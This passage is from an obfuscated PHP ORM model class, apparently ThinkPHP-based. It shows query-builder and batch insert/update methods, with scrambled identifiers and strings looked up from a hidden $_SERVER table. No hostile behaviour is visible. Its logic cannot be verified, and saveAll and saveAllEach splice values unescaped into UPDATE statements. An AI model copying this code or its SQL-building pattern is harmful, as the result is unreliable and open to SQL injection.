$this->options[$÷å¨ñ[347]][] = $¾ö—“àÚ; return $this; } public function cache($ƒ²É²¡ = true, $¶†ƒú¨ = null, $‰Âó¿í· = '') { $“¥¤ñúÙ =& $_SERVER[§ŒØóıü]; if (!1 !== $ƒ²É²¡) { $this->options[$“¥¤ñúÙ[349]] = array($“¥¤ñúÙ[94] => $ƒ²É²¡, $“¥¤ñúÙ[339] => $¶†ƒú¨, $“¥¤ñúÙ[33] => $‰Âó¿í·); } return $this; } public function field($¯ÀµóæË, $Á™áÜñ· = false) { $şœ¶¯ß‡ =& $_SERVER[§ŒØóıü]; if (!0 === $¯ÀµóæË) { $¶‚œÃ‹Ë = $this->getDbFields(); $¯ÀµóæË = $¶‚œÃ‹Ë ? $¶‚œÃ‹Ë : $şœ¶¯ß‡[189]; } elseif ($Á™áÜñ·) { if (is_string($¯ÀµóæË)) { $¯ÀµóæË = explode($şœ¶¯ß‡[50], $¯ÀµóæË); } $¶‚œÃ‹Ë = $this->getDbFields(); $¯ÀµóæË = $¶‚œÃ‹Ë ? array_diff($¶‚œÃ‹Ë, $¯ÀµóæË) : $¯ÀµóæË; } $this->options[$şœ¶¯ß‡[273]] = $¯ÀµóæË; return $this; } public function scope($·˜£ = '', $³¾ª¼É = NULL) { $øšÀ®‚ =& $_SERVER[§ŒØóıü]; if ($øšÀ®‚[12] === $·˜£) { if (isset($this->_scope[$øšÀ®‚[37]])) { $ËŸ¢æ‘ù = $this->_scope[$øšÀ®‚[37]]; } else { return $this; } } elseif (is_string($·˜£)) { $‘¥Õâáú = explode($øšÀ®‚[50], $·˜£); $ËŸ¢æ‘ù = array(); foreach ($‘¥Õâáú as $‹çğ„’ì) { if (!isset($this->_scope[$‹çğ„’ì])) { continue; } $ËŸ¢æ‘ù = array_merge($ËŸ¢æ‘ù, $this->_scope[$‹çğ„’ì]); } if (!empty($³¾ª¼É) && is_array($³¾ª¼É)) { $ËŸ¢æ‘ù = array_merge($ËŸ¢æ‘ù, $³¾ª¼É); } } elseif (is_array($·˜£)) { $ËŸ¢æ‘ù = $·˜£; } if (is_array($ËŸ¢æ‘ù) && !empty($ËŸ¢æ‘ù)) { $this->options = array_merge($this->options, array_change_key_case($ËŸ¢æ‘ù)); } return $this; } public function where($¼ñ÷ÓÜå, $€è©¾Óê = null) { $–ûõÊ’Ã =& $_SERVER[§ŒØóıü]; if (!is_null($€è©¾Óê) && is_string($¼ñ÷ÓÜå)) { if (!is_array($€è©¾Óê)) { $€è©¾Óê = func_get_args(); array_shift($€è©¾Óê); } $€è©¾Óê = array_map(array($this->db, $–ûõÊ’Ã[343]), $€è©¾Óê); $¼ñ÷ÓÜå = vsprintf($¼ñ÷ÓÜå, $€è©¾Óê); } elseif (is_object($¼ñ÷ÓÜå)) { $¼ñ÷ÓÜå = get_object_vars($¼ñ÷ÓÜå); } elseif (is_array($¼ñ÷ÓÜå)) { foreach ($¼ñ÷ÓÜå as $Öíôë·Ò => $¨´â†Öş) { if ((is_numeric($Öíôë·Ò) || !$Öíôë·Ò) && is_string($¨´â†Öş)) { if (strpos($¨´â†Öş, $–ûõÊ’Ã[350]) === 0) { continue; } think_trace($–ûõÊ’Ã[351], $–ûõÊ’Ã[12], $–ûõÊ’Ã[49]); die; } } } if (is_string($¼ñ÷ÓÜå) && $–ûõÊ’Ã[12] != $¼ñ÷ÓÜå) { $ºº¨ÀåÓ = array(); $ºº¨ÀåÓ[$–ûõÊ’Ã[352]] = $¼ñ÷ÓÜå; $¼ñ÷ÓÜå = $ºº¨ÀåÓ; } if (isset($this->options[$–ûõÊ’Ã[275]])) { $this->options[$–ûõÊ’Ã[275]] = array_merge($this->options[$–ûõÊ’Ã[275]], $¼ñ÷ÓÜå); } else { $this->options[$–ûõÊ’Ã[275]] = $¼ñ÷ÓÜå; } return $this; } public function limit($õ“ÊæĞœ, $¦ÂÇÈÁà = null) { $ã¸¬’´¾ =& $_SERVER[§ŒØóıü]; $this->options[$ã¸¬’´¾[292]] = is_null($¦ÂÇÈÁà) ? $õ“ÊæĞœ : $õ“ÊæĞœ . $ã¸¬’´¾[50] . $¦ÂÇÈÁà; return $this; } public function page($Ì®»µ½, $¸øáì”æ = null) { $•ÃéÖåŞ =& $_SERVER[§ŒØóıü]; $this->options[$•ÃéÖåŞ[353]] = is_null($¸øáì”æ) ? $Ì®»µ½ : $Ì®»µ½ . $•ÃéÖåŞ[50] . $¸øáì”æ; return $this; } public function comment($Çí½á„¥) { $this->options[$_SERVER[§ŒØóıü][354]] = $Çí½á„¥; return $this; } public function setProperty($‹€·œ¹§, $¡§Å“ò¼) { if (property_exists($this, $‹€·œ¹§)) { $this->{$‹€·œ¹§} = $¡§Å“ò¼; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\x54\151\x6d\x65", "\x74\151\x6d\145", "\151\x6e\x73\145\162\x74\x2c\165\x70\144\x61\164\145", "\146\165\x6e\x63\x74\151\x6f\x6e"), array("\143\x72\145\x61\164\x65\x54\x69\x6d\145", "\x74\151\x6d\145", "\151\156\x73\x65\x72\164", "\146\165\156\143\164\151\157\156")); public function setDataAuto($î³½¡œ) { $this->dataAuto = $î³½¡œ; } public function __construct($­°Î¦ô = '', $ÓÈ¿ôã = '', $÷»™Ï¿· = '') { parent::__construct($­°Î¦ô, $ÓÈ¿ôã, $÷»™Ï¿·); } protected $tableMeta = array(); protected function _beforeInsert(&$ ¿ì¶©·, $ŠÏÂöËú) { $‹ÑÊ÷ÅÕ =& $_SERVER[§ŒØóıü]; if (!$this->checkDataAutoHas($‹ÑÊ÷ÅÕ[355])) { return; } $this->dataBeforeFilter($ ¿ì¶©·, $‹ÑÊ÷ÅÕ[355]); } protected function _beforeUpdate(&$ŞÁê–‹æ, $ü “·™Ğ) { $ô•Š¿’ =& $_SERVER[§ŒØóıü]; if (!$this->checkDataAutoHas($ô•Š¿’[356])) { return; } $this->dataBeforeFilter($ŞÁê–‹æ, $ô•Š¿’[356]); } protected function _afterSelect(&$‘µ²ÔÍ, $ˆ˜²¯Á) { if (!is_array($‘µ²ÔÍ)) { return; } if (!$this->checkDataAutoHas($_SERVER[§ŒØóıü][357])) { return; } foreach ($‘µ²ÔÍ as &$ã›—Ìåˆ) { $this->dataAfterFilter($ã›—Ìåˆ); } unset($ã›—Ìåˆ); } protected function _afterFind(&$¹ˆéı…Î, $¯òƒ“İ˜) { if (!is_array($¹ˆéı…Î)) { return; } if (!$this->checkDataAutoHas($_SERVER[§ŒØóıü][357])) { return; } $this->dataAfterFilter($¹ˆéı…Î); } public static function textEncode($˜´¤Ï¦Œ) { if (!$˜´¤Ï¦Œ) { return $˜´¤Ï¦Œ; } $ùÑ¯ ¼Â = json_encode($˜´¤Ï¦Œ); $ùÑ¯ ¼Â = preg_replace_callback($_SERVER[§ŒØóıü][358], function ($Ö±»şÂä) { return addslashes($Ö±»şÂä[0]); }, $ùÑ¯ ¼Â); return json_decode($ùÑ¯ ¼Â); } public static function textDecode($®–’·©) { $—¯ƒîÕ =& $_SERVER[§ŒØóıü]; $­Å’óÍŞ = json_encode($®–’·©); $­Å’óÍŞ = preg_replace_callback($—¯ƒîÕ[359], function ($½ñì¢õ¨) { return $_SERVER[§ŒØóıü][97]; }, $­Å’óÍŞ); return json_decode($­Å’óÍŞ); } public function setAutoIncrement($ò‰°¦ÆÉ) { $×ò˜¼Œ± = array($this->getPk() => $ò‰°¦ÆÉ); $ÑÁÙíåº = $this->data($×ò˜¼Œ±)->add(); if ($ÑÁÙíåº) { $this->delete($ÑÁÙíåº); } } public function getAutoIncrement() { $­ØÚÎí¢ = $this->getTableName(); $Ú¶¿¿éĞ = $this->max($this->getPk()); $Û¨½›Å– = $this->query("\163\150\157\167\40\x74\x61\142\154\x65\x20\x73\x74\141\x74\x75\x73\x20\x77\150\145\x72\145\40\x4e\x61\155\145\x3d\47{$­ØÚÎí¢}\47"); $éÅŞ¯ = $Û¨½›Å–[0][$_SERVER[§ŒØóıü][360]]; $ßªº€Ôß = max($Ú¶¿¿éĞ, $éÅŞ¯); return $ßªº€Ôß; } protected function _callBefore($ªÙ–×µ, $ı—ŠÁ¢½) { return $this->cacheCallCheck($ªÙ–×µ, $ı—ŠÁ¢½, !1); } protected function _callAfter($ŒÎëê, $ëâŒ¢ö«) { return $this->cacheCallCheck($ŒÎëê, $ëâŒ¢ö«, !0); } protected function cacheFunctionAlias($‚¬…êŠ³) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($»û…àóÛ, $Â¯Ãªøå, $–ó¦ºÀ« = false) { $Í´´Ö¯™ = $this->cacheFunctionAlias($Â¯Ãªøå); if (!$Í´´Ö¯™) { return; } foreach ($Í´´Ö¯™ as $¢º–Ü¿ => $å–³Ñ¬Ø) { $¶ Ÿ›Ÿ = $å–³Ñ¬Ø[0]; $üşôº‚Ó = explode($_SERVER[§ŒØóıü][50], $å–³Ñ¬Ø[1]); if ($»û…àóÛ == $¢º–Ü¿) { return $this->cacheFunctionGet($¢º–Ü¿, $¶ Ÿ›Ÿ); } if ($–ó¦ºÀ« && in_array($»û…àóÛ, $üşôº‚Ó)) { $this->cacheFunctionClear($¢º–Ü¿, $¶ Ÿ›Ÿ); } } } public function cacheFunctionGet($ï¼×±Œ, $‰İıÛÀ²) { $íÈğ·íÊ = $this->cacheKeyMake($ï¼×±Œ, $‰İıÛÀ²); $Ô‹ŠÑçÔ = Cache::get($íÈğ·íÊ); if (!is_array($Ô‹ŠÑçÔ)) { $Ô‹ŠÑçÔ = call_user_func_array(array($this, $ï¼×±Œ), array($‰İıÛÀ², !0)); Cache::set($íÈğ·íÊ, $Ô‹ŠÑçÔ); } return $Ô‹ŠÑçÔ; } public function cacheFunctionClear($Òƒì×íì, $Ï€¯”«ƒ) { $ëë¶³“Ô = $Ï€¯”«ƒ; if (!is_array($Ï€¯”«ƒ)) { $ëë¶³“Ô = array($Ï€¯”«ƒ); } foreach ($ëë¶³“Ô as $·¯íèëõ) { $¾Ë¾Ï–Ò = $this->cacheKeyMake($Òƒì×íì, $·¯íèëõ); Cache::remove($¾Ë¾Ï–Ò); } } private function cacheKeyMake($“×ä·‘, $¾ÂóŸù¾) { $ª¦ÖÄ’ã =& $_SERVER[§ŒØóıü]; return get_class($this) . $ª¦ÖÄ’ã[11] . $“×ä·‘ . $ª¦ÖÄ’ã[361] . $¾ÂóŸù¾; } protected function selectPageReset() { $½½±ı» =& $_SERVER[§ŒØóıü]; if (isset($GLOBALS[$½½±ı»[362]])) { return; } $GLOBALS[$½½±ı»[362]] = isset($GLOBALS[$½½±ı»[7]][$½½±ı»[363]]) ? $GLOBALS[$½½±ı»[7]][$½½±ı»[363]] : !1; $GLOBALS[$½½±ı»[364]] = isset($GLOBALS[$½½±ı»[7]][$½½±ı»[353]]) ? $GLOBALS[$½½±ı»[7]][$½½±ı»[353]] : !1; $GLOBALS[$½½±ı»[7]][$½½±ı»[363]] = !1; $GLOBALS[$½½±ı»[7]][$½½±ı»[353]] = !1; } protected function selectPageRestore() { $áåƒú¢­ =& $_SERVER[§ŒØóıü]; if (!isset($GLOBALS[$áåƒú¢­[362]])) { return; } $GLOBALS[$áåƒú¢­[7]][$áåƒú¢­[363]] = $GLOBALS[$áåƒú¢­[362]]; $GLOBALS[$áåƒú¢­[7]][$áåƒú¢­[353]] = $GLOBALS[$áåƒú¢­[364]]; if ($GLOBALS[$áåƒú¢­[7]][$áåƒú¢­[363]] === !1) { unset($GLOBALS[$áåƒú¢­[7]][$áåƒú¢­[363]]); } if ($GLOBALS[$áåƒú¢­[7]][$áåƒú¢­[353]] === !1) { unset($GLOBALS[$áåƒú¢­[7]][$áåƒú¢­[353]]); } unset($GLOBALS[$áåƒú¢­[362]]); unset($GLOBALS[$áåƒú¢­[364]]); } protected function selectPage($½¼·«äı = 200, $—‹–—Áš = 1) { $²Øø· =& $_SERVER[§ŒØóıü]; global $in; $Ù”òªí” = $this->optionsValue(); $ÙÉ®üæÙ = 50000; $½¼·«äı = isset($in[$²Øø·[363]]) && $in[$²Øø·[363]] ? $in[$²Øø·[363]] : $½¼·«äı; if ($½¼·«äı === -1) { $in[$²Øø·[363]] = !1; $ÙÉ®üæÙ = 100000000; $½¼·«äı = $ÙÉ®üæÙ; } $­º˜¯¥‹ = $Ù”òªí”; $­º˜¯¥‹[$²Øø·[365]] = array(); $½¼·«äı = intval($½¼·«äı); $½¼·«äı = $½¼·«äı <= 5 ? 5 : ($½¼·«äı >= $ÙÉ®üæÙ ? $ÙÉ®üæÙ : $½¼·«äı); $—‹–—Áš = intval(isset($in[$²Øø·[353]]) && $in[$²Øø·[353]] ? $in[$²Øø·[353]] : $—‹–—Áš); $—‹–—Áš = $—‹–—Áš <= 1 ? 1 : $—‹–—Áš; $®’¦Ëı = array(); $æ·šºÄ = 1; if ($—‹–—Áš == 1 && $æ·šºÄ) { $this->optionsValue($Ù”òªí”); $®’¦Ëı = $this->page($—‹–—Áš, $½¼·«äı)->select(); $¡« ïû… = is_array($®’¦Ëı) ? count($®’¦Ëı) : 0; if ($¡« ïû… < $½¼·«äı) { $«´ìà = 1; } else { $this->optionsValue($­º˜¯¥‹); $¡« ïû… = intval($this->count()); $«´ìà = ceil($¡« ïû… / $½¼·«äı); } } else { $this->optionsValue($­º˜¯¥‹); $¡« ïû… = intval($this->count()); $«´ìà = ceil($¡« ïû… / $½¼·«äı); $—‹–—Áš = $—‹–—Áš >= $«´ìà ? $«´ìà : $—‹–—Áš; $this->optionsValue($Ù”òªí”); $®’¦Ëı = $this->page($—‹–—Áš, $½¼·«äı)->select(); } if (!is_array($®’¦Ëı)) { $®’¦Ëı = array(); } if ($«´ìà == 1) { $¡« ïû… = count($®’¦Ëı); } $øíşïÃÓ = array($²Øø·[366] => array($²Øø·[367] => $¡« ïû…, $²Øø·[363] => $½¼·«äı, $²Øø·[353] => $—‹–—Áš, $²Øø·[368] => $«´ìà), $²Øø·[369] => $®’¦Ëı); return $øíşïÃÓ; } protected function checkLength($Ê¤÷ˆı¸, $îµâ½´´ = 0, $ºÛ¯ª‹ = '') { $Ø—³è½¯ =& $_SERVER[§ŒØóıü]; $îµâ½´´ = $îµâ½´´ ? $îµâ½´´ : 65536; if (!$Ê¤÷ˆı¸ || strlen($Ê¤÷ˆı¸) < $îµâ½´´) { return; } $ºÛ¯ª‹ = $ºÛ¯ª‹ ? $ºÛ¯ª‹ . $Ø—³è½¯[71] : $Ø—³è½¯[12]; show_json($ºÛ¯ª‹ . LNG($Ø—³è½¯[370]) . "\x28{$îµâ½´´}\x29", !1); } protected function metaSet($ Ó«‘¾¤, $‹×ìß«ê = null, $’Ÿ·½©¶ = null) { $¹‹¶ºä =& $_SERVER[§ŒØóıü]; if (!$this->tableMeta || !$ Ó«‘¾¤) { return !1; } $‹…×ƒ = $this->tableMeta[$¹‹¶ºä[371]]; $ÈÔÀŸ‘ª = $this->tableMeta[$¹‹¶ºä[372]]; $µ€…ÓÄò = Model($ÈÔÀŸ‘ª); $á–ûÀëï = array($‹…×ƒ => $ Ó«‘¾¤, $¹‹¶ºä[373] => $‹×ìß«ê); if (is_null($‹×ìß«ê)) { return $µ€…ÓÄò->where(array($‹…×ƒ => $ Ó«‘¾¤))->delete(); } if (is_null($’Ÿ·½©¶) && is_string($‹×ìß«ê)) { return $µ€…ÓÄò->where($á–ûÀëï)->delete(); } $…àè±’Ì = is_array($‹×ìß«ê) ? $‹×ìß«ê : array(); if (is_string($‹×ìß«ê)) { $…àè±’Ì[$‹×ìß«ê] = $’Ÿ·½©¶; } $ëí´öŸ = array(); foreach ($…àè±’Ì as $ïÑøˆÉµ => $‚©éáŸ‡) { if (is_null($‚©éáŸ‡) && is_string($ïÑøˆÉµ)) { $µ€…ÓÄò->where(array($‹…×ƒ => $ Ó«‘¾¤, $¹‹¶ºä[373] => $ïÑøˆÉµ))->delete(); continue; } $this->checkLength($‚©éáŸ‡, !1, $ÈÔÀŸ‘ª . $¹‹¶ºä[4] . $ïÑøˆÉµ); $ëí´öŸ[] = array($‹…×ƒ => $ Ó«‘¾¤, $¹‹¶ºä[94] => $ïÑøˆÉµ, $¹‹¶ºä[374] => $‚©éáŸ‡); } $ÄèØ‹€å = $¹‹¶ºä[375] . $ÈÔÀŸ‘ª; CacheLock::lock($ÄèØ‹€å); $µ€…ÓÄò->where(array($‹…×ƒ => $ Ó«‘¾¤))->addAll($ëí´öŸ, array(), !0); CacheLock::unlock($ÄèØ‹€å); return !0; } public function metaGet($ß‡ÖÉ˜Û, $Àô´ßô¦ = false) { $á²ÜËÂº =& $_SERVER[§ŒØóıü]; if (!$this->tableMeta) { return array(); } $µ¡²ç = $this->tableMeta[$á²ÜËÂº[371]]; $úÄëİ”– = Model($this->tableMeta[$á²ÜËÂº[372]]); if ($Àô´ßô¦) { $âª–ÓÎ¯ = array($µ¡²ç => $ß‡ÖÉ˜Û, $á²ÜËÂº[94] => $Àô´ßô¦); return $úÄëİ”–->where($âª–ÓÎ¯)->getField($á²ÜËÂº[374]); } $âª–ÓÎ¯ = array($µ¡²ç => $ß‡ÖÉ˜Û); $»ßî¿Á° = $úÄëİ”–->field($á²ÜËÂº[376])->where($âª–ÓÎ¯)->select(); $»ßî¿Á° = array_to_keyvalue($»ßî¿Á°, $á²ÜËÂº[94], $á²ÜËÂº[374]); return $»ßî¿Á°; } private function checkDataAutoHas($ØÚ „İ•) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $±ñ…ˆÃ€) { if (in_array($ØÚ „İ•, explode($_SERVER[§ŒØóıü][50], $±ñ…ˆÃ€[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$úÁı´…, $¾»…ª’ñ) { $ûŞİª…‹ =& $_SERVER[§ŒØóıü]; if (!is_array($úÁı´…)) { return; } foreach ($this->dataAuto as $¹ôÙ±Í) { $Ø±¾‡õ¡ = $¹ôÙ±Í[0]; if (!in_array($¾»…ª’ñ, explode($ûŞİª…‹[50], $¹ôÙ±Í[2]))) { continue; } switch (trim($¹ôÙ±Í[3])) { case $ûŞİª…‹[321]: case $ûŞİª…‹[322]: $ë”«Ïöî = $¹ôÙ±Í[1]; $ÃİßÑ«á = isset($¹ôÙ±Í[4]) ? (array) $¹ôÙ±Í[4] : array(); if ($ë”«Ïöî == $ûŞİª…‹[180] && array_key_exists($Ø±¾‡õ¡, $úÁı´…)) { if (!$úÁı´…[$Ø±¾‡õ¡]) { unset($úÁı´…[$Ø±¾‡õ¡]); } break; } if (isset($úÁı´…[$Ø±¾‡õ¡])) { array_unshift($ÃİßÑ«á, $úÁı´…[$Ø±¾‡õ¡]); } if ($ûŞİª…‹[321] == $¹ôÙ±Í[3]) { $úÁı´…[$Ø±¾‡õ¡] = call_user_func_array($ë”«Ïöî, $ÃİßÑ«á); } else { $úÁı´…[$Ø±¾‡õ¡] = call_user_func_array(array(&$this, $ë”«Ïöî), $ÃİßÑ«á); } break; case $ûŞİª…‹[270]: if (isset($úÁı´…[$Ø±¾‡õ¡]) && $úÁı´…[$Ø±¾‡õ¡]) { $úÁı´…[$Ø±¾‡õ¡] = call_user_func_array(array(&$this, $¹ôÙ±Í[1]), array($úÁı´…[$Ø±¾‡õ¡])); } break; case $ûŞİª…‹[273]: $úÁı´…[$Ø±¾‡õ¡] = $úÁı´…[$¹ôÙ±Í[1]]; break; case $ûŞİª…‹[294]: if (isset($úÁı´…[$Ø±¾‡õ¡]) && !is_string($úÁı´…[$Ø±¾‡õ¡])) { $úÁı´…[$Ø±¾‡õ¡] = json_encode_force($úÁı´…[$Ø±¾‡õ¡]); } break; case $ûŞİª…‹[323]: if ($úÁı´…[$Ø±¾‡õ¡] === $ûŞİª…‹[12]) { unset($úÁı´…[$Ø±¾‡õ¡]); } break; case $ûŞİª…‹[324]: $úÁı´…[$Ø±¾‡õ¡] = $¹ôÙ±Í[1]; default: break; } } if ($¾»…ª’ñ == $ûŞİª…‹[355]) { $Ñ«Åè• = strtolower($this->db->getDbType()); if (strpos($Ñ«Åè•, $ûŞİª…‹[13]) !== 0) { return; } $Î•¬øºò = $this->field(!0)->fields; $´ğ„¹…ş = $Î•¬øºò[$ûŞİª…‹[252]]; if (isset($Î•¬øºò[$ûŞİª…‹[251]])) { unset($´ğ„¹…ş[$Î•¬øºò[$ûŞİª…‹[251]]]); } foreach ($´ğ„¹…ş as $»¸õõ¥ => $¾»…ª’ñ) { if (!isset($úÁı´…[$»¸õõ¥])) { $úÁı´…[$»¸õõ¥] = $ûŞİª…‹[12]; } } } } private function dataAfterFilter(&$…È‘Æî£) { $õÄùû»§ =& $_SERVER[§ŒØóıü]; foreach ($this->dataAuto as $Ï­åçä¾) { $´È¦Üèñ = $Ï­åçä¾[0]; if (!isset($…È‘Æî£[$´È¦Üèñ])) { continue; } if (!in_array($õÄùû»§[357], explode($õÄùû»§[50], $Ï­åçä¾[2]))) { continue; } switch (trim($Ï­åçä¾[3])) { case $õÄùû»§[321]: case $õÄùû»§[322]: $°ªİèô¿ = isset($Ï­åçä¾[4]) ? (array) $Ï­åçä¾[4] : array(); array_unshift($°ªİèô¿, $…È‘Æî£[$´È¦Üèñ]); if (isset($Ï­åçä¾[4]) && $Ï­åçä¾[4] == $õÄùû»§[377]) { $°ªİèô¿ = array($…È‘Æî£[$´È¦Üèñ]); } if ($õÄùû»§[321] == $Ï­åçä¾[3]) { $…È‘Æî£[$´È¦Üèñ] = call_user_func_array($Ï­åçä¾[1], $°ªİèô¿); } else { $…È‘Æî£[$´È¦Üèñ] = call_user_func_array(array(&$this, $Ï­åçä¾[1]), $°ªİèô¿); } break; case $õÄùû»§[270]: if (isset($…È‘Æî£[$´È¦Üèñ]) && $…È‘Æî£[$´È¦Üèñ]) { $…È‘Æî£[$´È¦Üèñ] = call_user_func_array(array(&$this, $Ï­åçä¾[1]), array($…È‘Æî£[$´È¦Üèñ])); } break; case $õÄùû»§[273]: $…È‘Æî£[$´È¦Üèñ] = $…È‘Æî£[$Ï­åçä¾[1]]; break; case $õÄùû»§[294]: $ŒÖ¦ˆèì = $…È‘Æî£[$´È¦Üèñ]; $…È‘Æî£[$´È¦Üèñ] = json_decode($ŒÖ¦ˆèì, !0); if (is_null($…È‘Æî£[$´È¦Üèñ])) { $…È‘Æî£[$´È¦Üèñ] = $ŒÖ¦ˆèì; } break; case $õÄùû»§[323]: if ($…È‘Æî£[$´È¦Üèñ] === $õÄùû»§[12]) { unset($…È‘Æî£[$´È¦Üèñ]); } break; case $õÄùû»§[324]: $…È‘Æî£[$´È¦Üèñ] = $Ï­åçä¾[1]; break; default: break; } } } public function saveAll($Ï«¾Š¸) { $Ü»£Ò‰¯ =& $_SERVER[§ŒØóıü]; $¤‡æØË = $this->tablePrefix . $this->tableName; $·›¬ì° = self::SQL_WHERE_IN_CHUNK; $Ï«¾Š¸ = is_array($Ï«¾Š¸) ? $Ï«¾Š¸ : array(); $ËÓãŒ×Ì = $Ü»£Ò‰¯[378]; $°ÔèÄµ = 0; $×â²èà› = array(); $ÙÃÖÉ ë = count($Ï«¾Š¸); for ($…¼³ˆ¶û = 0; $…¼³ˆ¶û < $ÙÃÖÉ ë; $…¼³ˆ¶û++) { $Úü–ˆÎ¿ = $Ï«¾Š¸[$…¼³ˆ¶û]; if (!is_array($Úü–ˆÎ¿) || count($Úü–ˆÎ¿) != 4) { continue; } $¬ñ¾à÷ˆ = "\125\x50\x44\101\124\105\x20\140{$¤‡æØË}\x60\40\x53\105\x54\40{$Úü–ˆÎ¿[2]}\x20\75\x20\103\101\123\x45\40{$Úü–ˆÎ¿[0]}\x20\12"; if ($°ÔèÄµ == 0) { $ËÓãŒ×Ì = $¬ñ¾à÷ˆ; } $×â²èà›[] = $Ü»£Ò‰¯[118] . $Úü–ˆÎ¿[1] . $Ü»£Ò‰¯[118]; $°ÔèÄµ++; $ËÓãŒ×Ì .= "\x20\127\110\105\116\x20\47{$Úü–ˆÎ¿[1]}\x27\x20\124\x48\x45\x4e\x20\47{$Úü–ˆÎ¿[3]}\47\x20\xa"; if ($°ÔèÄµ == $·›¬ì° || $…¼³ˆ¶û == $ÙÃÖÉ ë - 1) { $âÅÔîôÁ = implode($Ü»£Ò‰¯[50], $×â²èà›); $ËÓãŒ×Ì .= "\x20\x45\116\104\40\40\127\x48\105\122\x45\40{$Úü–ˆÎ¿[0]}\x20\x49\116\40\x28{$âÅÔîôÁ}\x29\x20"; $this->execute($ËÓãŒ×Ì); $°ÔèÄµ = 0; $ËÓãŒ×Ì = $¬ñ¾à÷ˆ; $this->chunkEventCheck(count($×â²èà›)); $×â²èà› = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÅŸŒü) { $Ùƒ°Êíû =& $_SERVER[§ŒØóıü]; $¸‡õ» = $this->tablePrefix . $this->tableName; foreach ($ÅŸŒü as $’ŸÓÄ¼) { if (!is_array($’ŸÓÄ¼) || count($’ŸÓÄ¼) != 4) { continue; } $Ö©ñÜí½ = $’ŸÓÄ¼[0] . $Ùƒ°Êíû[379] . $’ŸÓÄ¼[1] . $Ùƒ°Êíû[118]; $îùˆÓÙ = $’ŸÓÄ¼[2] . $Ùƒ°Êíû[379] . $’ŸÓÄ¼[3] . $Ùƒ°Êíû[118]; $š„“¿‹‡ = "\x75\160\144\141\x74\x65\x20{$¸‡õ»}\x20\x73\145\164\x20{$îùˆÓÙ}\x20\x77\150\145\x72\145\x20{$Ö©ñÜí½}\x3b"; $this->execute($š„“¿‹‡); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($§²Ú¿¼¤ = false, $İ”¾á®Å = false) { $this->_chunkEvent = $§²Ú¿¼¤; $this->_chunkEventParam = $İ”¾á®Å; } private function chunkEventCheck($õ“îîà”) { if (!$this->_chunkEvent) { return; } $èÇ „„Ñ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $èÇ „„Ñ[$_SERVER[§ŒØóıü][380]] = $õ“îîà”; Hook::trigger($this->_chunkEvent, $èÇ „„Ñ); } public function addAll($²¨ˆÍ—¤, $“É‡şÜ– = array(), $äúŞØ¼ù = false) { $Ì–¤¤ =& $_SERVER[§ŒØóıü]; ignore_timeout(); $ª”•¡ = self::SQL_WHERE_IN_CHUNK; if (empty($²¨ˆÍ—¤)) { $this->error = think_lang($Ì–¤¤[271]); return !1; } $“É‡şÜ– = $this->_parseOptions($“É‡şÜ–); foreach ($²¨ˆÍ—¤ as $ïæÑóĞ¾ => $ª‡“³ôÌ) { $²¨ˆÍ—¤[$ïæÑóĞ¾] = $this->_facade($ª‡“³ôÌ); $this->_beforeInsert($²¨ˆÍ—¤[$ïæÑóĞ¾], $“É‡şÜ–); } if (method_exists($this->db, $Ì–¤¤[272])) { for ($·ì™‘®õ = 0; $·ì™‘®õ < count($²¨ˆÍ—¤); $·ì™‘®õ += $ª”•¡) { $‘ š°³Ã = array_slice($²¨ˆÍ—¤, $·ì™‘®õ, $ª”•¡); if (!is_array($‘ š°³Ã) || count($‘ š°³Ã) == 0) { break; } $†éò®Ç = $this->db->insertAll($‘ š°³Ã, $“É‡şÜ–, $äúŞØ¼ù); $this->chunkEventCheck(count($‘ š°³Ã)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($²¨ˆÍ—¤ as $ïæÑóĞ¾ => $ª‡“³ôÌ) { $†éò®Ç = $this->db->insert($ª‡“³ôÌ, $“É‡şÜ–, $äúŞØ¼ù); } $this->commit(); } if (!1 !== $†éò®Ç) { $ñĞ³¦ûŠ = $this->getLastInsID(); if ($ñĞ³¦ûŠ) { return $ñĞ³¦ûŠ; } } return $†éò®Ç; } public function save($úÈÀğÂ¸ = '', $Îş˜Ş’† = array()) { $”Ôï«¢ï =& $_SERVER[§ŒØóıü]; $­ŒìˆüÑ = self::SQL_WHERE_IN_CHUNK; $ˆö¡á”Ô = $this->optionsValue(); $Ó×å—ÚŒ = $this->findWhereField($ˆö¡á”Ô); if (!$Ó×å—ÚŒ) { return parent::save($úÈÀğÂ¸, $Îş˜Ş’†); } $´èÀ“æì = 0; $ÎÚ¾»°ş = $ˆö¡á”Ô[$”Ôï«¢ï[275]][$Ó×å—ÚŒ][1]; $ÎÚ¾»°ş = is_array($ÎÚ¾»°ş) ? $ÎÚ¾»°ş : array(); $©‡ôËÛ = count($ÎÚ¾»°ş); for ($ßØÀ»Æ÷ = 0; $ßØÀ»Æ÷ < $©‡ôËÛ; $ßØÀ»Æ÷ += $­ŒìˆüÑ) { $éı³ã€É = array_slice($ÎÚ¾»°ş, $ßØÀ»Æ÷, $­ŒìˆüÑ); if (!is_array($éı³ã€É) || count($éı³ã€É) == 0) { break; } $ˆö¡á”Ô[$”Ôï«¢ï[275]][$Ó×å—ÚŒ][1] = $éı³ã€É; $this->optionsValue($ˆö¡á”Ô); $´èÀ“æì += parent::save($úÈÀğÂ¸, $Îş˜Ş’†); $this->chunkEventCheck(count($éı³ã€É)); } $this->chunkEventSet(); return $´èÀ“æì; } public function add($ÓŸ™¡ûÃ = '', $ëÃ£¢©® = array(), $ëôÕßŞ = false) { if ($this->addTaskStatus && is_array($ÓŸ™¡ûÃ)) { $this->addTaskData[] = $ÓŸ™¡ûÃ; return; } return parent::add($ÓŸ™¡ûÃ, $ëÃ£¢©®, $ëôÕßŞ); } public function parseWhereLike($à¾ÜÉÏ , $Õ½ì¯Ìú = '', $­±¸—«® = false, &$¥¶¯©æµ = false) { $„ÍÊÑˆ =& $_SERVER[§ŒØóıü]; $ƒ­æßó = $GLOBALS[$„ÍÊÑˆ[6]][$„ÍÊÑˆ[381]]; if (!$ƒ­æßó[$„ÍÊÑˆ[382]]) { return $à¾ÜÉÏ ; } if 